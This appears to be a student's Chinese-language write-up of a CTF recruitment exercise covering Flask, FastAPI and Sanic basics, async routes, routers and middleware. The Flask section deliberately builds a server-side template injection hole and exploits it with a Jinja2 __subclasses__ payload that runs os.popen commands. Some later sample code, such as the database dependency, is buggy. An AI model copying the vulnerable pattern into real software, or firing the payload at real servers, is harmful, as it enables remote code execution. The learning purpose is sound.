---
title: "御林招新题：python 后端"
subtitle: "御林招新题：python 后端"
summary: "学习 Flask、FastApi、Sanic 模板的相关知识"
description: "学习 Flask、FastApi、Sanic 模板的相关知识"
image: ""
date: 2025-10-20
lastmod: 2025-10-20
hiddenFromHomePage: True
draft: false
toc:
 enable: true
weight: false
categories: ["CTF"]
tags: ["CTF"]
---

## **Flask**

- **创建应用**：创建一个简单的 Flask 应用，包含一个首页 (`/`) 和一个带参数的路由 (`/hello/<name>`)，返回个性化的问候语。
- **实现服务器端模板注入（SSTI）**：自己设置黑名单，自己渲染输入的name，设一个SSTI的漏洞

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

# 黑名单，设置得简单了一些
blacklist = ["{{", "}}"]

@app.route('/')
def index():
    return "欢迎！"

@app.route('/hello/<name>')
def hello(name):
    # 故意使用不安全的模板渲染，存在 SSTI 漏洞
    for word in blacklist:
        if word in name:
            return "输入包含非法内容！"
    # 渲染输入
    template = f"Hello, {name}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

> - 漏洞成因：
>
>   - ```python
>     template = f"Hello, {name}!"  # 将用户输入的 name 直接拼接到模板中
>     return render_template_string(template)  # 渲染包含用户输入的模板
>     ```
>
>   - 在引擎渲染 template 的时候，会执行其中的恶意代码
>
> - 安全写法：
>
>   - ```python
>     # 将 name 作为变量传入模板，这样只会当成字符串处理
>     return render_template('hello.html', name=name)
>     ```

- **完成题目**：把自己出的题，打出来（）

  > 相信做出来之后，一定会对Basic的SSTI靶场有更深的理解

  ![image-20251020211032658](https://raw.githubusercontent.com/calendar0917/images/master/image-20251020211032658.png)

  `{%print(''.__class__.__base__.__subclasses__())%}`，找可用的函数

  ```python
  for i, cls in enumerate(object.__subclasses__()):
      try:
          if 'os.' in cls.__init__.__globals__:
              print(f"index: {i}, class: {cls}")
      except:
          continue
  ```

  `{% print(''.__class__.__base__.__subclasses__()[n].__init__.__globals__.os.popen('calc').read()) %}`，弹了计算器

  

  ![image-20251020214004864](https://raw.githubusercontent.com/calendar0917/images/master/image-20251020214004864.png)

###  Flask 的基础知识

```python
@app.route('/login/<name>', methods=['GET', 'POST'])# 指定路由、请求方式，用 request.method() 获取
def login():
   
    # 获取参数的方法，需要借助 request 模块
    username = request.form.get('username')  # 获取表单
    query = request.args.get('query')# ?参数
    name = name # 路径参数,可以直接使用
    # 响应
    response = make_response('自定义响应', 201)  # 状态码 201（创建成功）
    response.headers['...'] = '...'  # 添加响应头
    return render_template('profile.html', name=username, age=20) # 模板渲染后返回

	# 会话技术
    app.secret_key = '...' # 设置密钥
    username = request.form.get('username')
    if username == 'admin':	# 验证用户名密码（实际需查询数据库）
        session['username'] = username  # 存储会话数据
        return redirect(url_for('dashboard'))
    return '登录失败'
```

```html
<!-- 模板语法 -->
<!-- 填充字段、条件判断 -->
<h1>欢迎，{{ name }}！</h1>  <!-- 变量替换 -->
{% if age >= 18 %}  <!-- 条件判断 -->
    <p>成年</p>
{% else %}
    <p>未成年</p>
{% endif %}

<!-- 循环遍历列表 -->
<ul>
    {% for hobby in ['读书', '运动'] %}
        <li>{{ hobby }}</li>
    {% endfor %}
</ul>
```

## **FastAPI 和 Sanic 基础**

- **创建应用**：分别为 FastAPI 和 Sanic 创建两个独立的应用。
- **路由与参数**：每个应用都应包含一个简单的路由 (`/`) 和一个带参数的路由 (`/items/{item_id}`)，并分别处理 GET 和 POST 请求。
- **数据校验**：在 FastAPI 应用中，使用 **Pydantic 模型**对 POST 请求的数据进行自动校验。

FastAPI:

```python
from fastapi import FastAPI
from pydantic import BaseModel

# 创建 FastAPI 应用实例
app = FastAPI()
# 定义 Pydantic 模型，用于 POST 请求数据校验
class Item(BaseModel):
    name: str
    price: float
    is_offer: bool = None  # 可选字段，默认值为 None

@app.get("/") # 简单路由
async def read_root():
    return {"message": "你好"}

@app.post("/items/{item_id}") # POST 请求，使用 Pydantic 模型校验数据
async def create_item(item_id: int, item: Item):
    # item 会自动根据 Item 模型校验请求体数据
    return {"item_id": item_id, **item.dict()}
```

Sanic：

```python
from sanic import Sanic
from sanic.response import json

# 创建 Sanic 应用实例
app = Sanic("SanicApp")

@app.route("/", methods=["GET"]) # 简单路由
async def read_root(request):
    return json({"message": "Hello from Sanic root"})

@app.route("/items/<item_id>", methods=["POST"]) # 带参数的路由（POST 请求）
async def create_item(request, item_id):    
    data = request.json # 手动获取并处理请求体数据（Sanic 需手动校验）
    if not data:
        return json({"error": "No data provided"}, status=400)
    return json({"item_id": item_id, **data})
```

> 主要区别在于对 Post 的数据的处理上，Sanic 要手动处理，FastAPI 可以借助 Pydantic 模型。
>
> 但是 Sanic 是异步非阻塞的框架，性能较高

## **异步编程实践**

- **异步函数**：在 FastAPI 中，创建一个异步路由 (`/async-task`)，该路由模拟一个耗时操作（例如，使用 `asyncio.sleep`），并验证其不会阻塞其他请求。

``` python
# 在原来的基础上添加函数
# import asyncio 补充
@app.get("/sync")
def sync_heavy_task(): # 同步函数（用于对比，会阻塞）
    time.sleep(3)  # 模拟耗时 3 秒的同步操作
    return "同步任务完成"

@app.get("/async") # 异步路由（模拟耗时操作，不会阻塞）
async def async_task():
    start_time = time.time()
    await asyncio.sleep(3)  # 模拟异步耗时操作（非阻塞）
    end_time = time.time()
    return {
        "message": "异步任务完成",
        "duration": end_time - start_time
    }
```

启动：`uvicorn fastapi_test:app --reload --port 8001`

> 1. 测试过程中发现，需要给上面加上 `--worker 1`，设置为单线程
> 2. 用命令行 curl 的时候，没有效果，同步异步看不出差别，**不知道为什么**
> 3. 用浏览器测，同时访问 /sync 时，明显不同步；同时访问 /async，基本同步；
>    - 但是一个先访问 /sync，另一个访问 /，是可以访问到 / 的，**不知道为什么**
>      - FastAPI 运行在**线程池模式**，虽然单进程，但是后台有多线程池（？）

- **依赖注入**：创建一个异步依赖函数，并在你的路由中使用它。这个依赖函数可以用来连接数据库或获取配置信息。

```python
async def get_db(): # 异步依赖函数（模拟数据库连接）
    print("建立数据库连接（异步）...")
    # conn = pymysql.connect(**db_config) 复用 mysql 的代码？ 要用 await！
    conn = await aiomysql.connect(**db_config)  # 异步建立连接
    try:
        yield conn
    finally:
        await conn.close()  # 异步关闭连接
    try:
        yield conn  # 提供依赖对象
    finally:
        print("关闭数据库连接（异步）...")


@app.get("/items/{item_id}") # 使用异步依赖的路由
async def read_item(item_id: int, conn = get_db()):
    start_time = time.time()
    cursor = conn.cursor()
    # 查询 students 表中的所有数据
    query_sql = "SELECT * FROM students"
    cursor.execute(query_sql)
    students_data = cursor.fetchall()
    end_time = time.time()
    return {
        "item_id": item_id,
        "db_connection": db,
        "query_duration": end_time - start_time
    }
```

> - 为什么用异步依赖？
>   - 使用**异步依赖（`async def get_db()`）** 的核心原因是为了匹配 FastAPI 的**异步编程模型**，避免因数据库操作阻塞整个应用，从而**提升并发处理能力**。
> - yield ？
>   - `yield` 最基础的作用是创建**生成器（generator）**，允许函数中断并返回中间结果，后续可**从断点继续执行**。在异步依赖中，被用来**管理资源的生命周期**（创建→使用→清理）。
>   - 调用时，会在 yield 处返回值并暂停，下一次调用的时候继续上一次的调用结果
> - await ？
>   - `await` 仅能在**异步函数（`async def` 定义）** 中使用，用于**暂停当前协程的执行**，等待另一个异步操作（如网络请求、IO 操作）完成后再继续，期间不会阻塞事件循环（允许其他任务运行）。
>   - 可以让出当前线程，等待耗时操作完成后再继续执行

## **项目结构与蓝图（APIRouter）**

- **蓝图应用**：将你的 API 拆分为多个模块，例如 `users` 和 `items`。使用 `APIRouter` 将这些模块组织起来，并在主应用中注册。

```py
# item.py
from fastapi import APIRouter
# 创建一个 APIRouter 实例，相当于一个子路由集合
item_router = APIRouter()

@item_router.get("/items/{item_id}")
def get_item(item_id: int):
    return {"item_id": item_id, "message": "获取物品信息"}

@item_router.post("/items/")
def create_item(name: str, price: float):
    return {"name": name, "price": price, "message": "创建物品成功"}
```

```py
# user.py
from fastapi import APIRouter
user_router = APIRouter()

@user_router.get("/users/{user_id}")
def get_user(user_id: int):
    return {"user_id": user_id, "message": "获取用户信息"}

@user_router.post("/users/")
def create_user(name: str):
    return {"name": name, "message": "创建用户成功"}
```

```py
# main.py
from fastapi import FastAPI
# 导入定义好的路由模块
import user
import item
app = FastAPI()

# 将用户路由注册到主应用，添加前缀 /users，这样访问用户相关接口需要用 /users/...
app.include_router(user.user_router, prefix="/users")
# 将物品路由注册到主应用，添加前缀 /items，访问物品相关接口需要用 /items/...
app.include_router(item.item_router, prefix="/items")
```

- **分离路由**：确保 `users` 相关的路由（如 `/users/{user_id}`）和 `items` 相关的路由（如 `/items/{item_id}`）分别在不同的文件中定义。

> 确保不同功能模块的路由（比如用户相关路由和物品相关路由）分别在不同的文件中定义，类似把代码解耦，便于维护

使用方法：

```
项目结构：
project/
├── main.py          # 主应用入口
├── routers/         # 存放所有路由模块的文件夹
│   ├── users.py     # 用户相关路由（登录、注册等）
│   └── items.py     # 商品相关路由（查询、创建等）
```

```py
# 组件中，创建 APIRouter 实例
router = APIRouter(
    prefix="/users",  # 该模块所有路由的统一前缀（访问时需加 /users）
    tags=["users"]    # 文档中归类的标签（方便在 /docs 中区分）
)
# 定义请求模型（可选，用于数据校验）
class UserCreate(BaseModel):
    username: str
    email: str
# 定义路由
@router.get("/{user_id}")
def get_user(user_id: int):
    ...

# main.py 中，创建主应用
app = FastAPI(title="...")
# 注册路由（将 users_router 和 items_router 挂载到主应用）
app.include_router(users_router) # 这样会自动匹配 users_router 的前缀
```

## **中间件与生命周期管理**

- **中间件**：为你的 FastAPI 应用添加一个自定义中间件，该中间件能够记录每个请求的耗时，并将信息打印到控制台。

> 中间件是在**请求到达路由**和**响应返回客户端**之间执行的代码，可用于日志记录、权限校验、耗时统计等。

```py
from fastapi import FastAPI, Request
import time
import asyncio

app = FastAPI()

@app.middleware("http")
async def log_request_time(request: Request, call_next): # 这里的 call_next 会自动填充
    print("中间件开始执行", flush=True)  # 强制刷新
    start_time = time.time()
    response = await call_next(request)
    process_time = (time.time() - start_time) * 1000
    print(f"请求 {request.method} {request.url.path} 耗时: {process_time:.2f}ms", flush=True)  # 强制刷新
    return response

@app.get("/test")
async def test_route():
    await asyncio.sleep(1)
    return {"message": "测试成功"}
```

> 测试的时候，用 vscode 的终端启动会看不到输出，换成了 cmd 才可以

![image-20251021082055612](https://raw.githubusercontent.com/calendar0917/images/master/image-20251021082055612.png)

- **异步状态管理**：使用 `app.on_event("startup")` 和 `app.on_event("shutdown")` 钩子，编写一个函数来初始化数据库连接池，并在应用关闭时安全地断开连接。

> [FastAPI class - FastAPI](https://fastapi.tiangolo.com/zh/reference/fastapi/?query=on_event#fastapi.FastAPI.on_event)：`on_event` is deprecated, use `lifespan` event handlers instead.
>
> 1. **错误处理更优雅**：`Lifespan` 可以通过上下文管理器（`async with`）捕获启动 / 关闭过程中的异常，确保资源正确清理。
> 2. **代码组织更清晰**：将启动和关闭逻辑集中在一个 `Lifespan` 类中，比分散的 `on_event` 装饰器更易维护。

```py
from fastapi import FastAPI
from contextlib import asynccontextmanager
import asyncpg

# 定义 lifespan 上下文管理器
@asynccontextmanager
async def lifespan(app: FastAPI):
    # 启动阶段：初始化资源
    print("应用启动中...")
    # 全局连接池对象
    app.state.db_pool = await asyncpg.create_pool(
        user="user",
        password="password",
        database="db",
        host="localhost"
    )
    yield  # 应用正常运行阶段，yield 后执行关闭逻辑
    # 关闭阶段：清理资源
    print("应用关闭中...")
    if hasattr(app.state, "db_pool"):
        await app.state.db_pool.close()
        print("数据库连接池已关闭")

app = FastAPI(lifespan=lifespan)

# 测试路由：使用数据库连接池
@app.get("/db-test")
async def db_test():
    async with app.state.db_pool.acquire() as conn:
        result = await conn.fetch("SELECT NOW()")
    return {"current_time": result[0]["now"]}